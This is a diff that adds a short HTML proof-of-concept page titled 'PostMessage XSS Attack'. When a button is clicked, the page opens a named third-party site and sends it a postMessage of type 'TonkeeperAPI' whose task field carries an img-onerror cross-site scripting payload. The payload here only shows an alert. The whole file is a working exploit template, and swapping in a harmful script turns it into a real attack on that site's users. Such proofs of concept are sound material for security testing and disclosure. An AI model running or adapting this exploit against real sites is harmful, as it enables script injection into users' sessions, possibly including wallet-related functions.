@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PostMessage XSS Attack</title>
+</head>
+<body>
+    <h1>PostMessage XSS Test</h1>
+    <button onclick="sendExploit()">Click to Send Exploit</button>
+
+    <script>
+        function sendExploit() {
+            const targetWindow = window.open('https://octopus.com');
+
+            targetWindow.postMessage({
+                type: "TonkeeperAPI",
+                message: {
+                    jsonrpc: "2.0",
+                    method: "taskUpdate",
+                    task: "<img src='x' onerror='alert(\"XSS Exploit!\")'>"
+                }
+            }, "*");
+        }
+    </script>
+</body>
+</html>
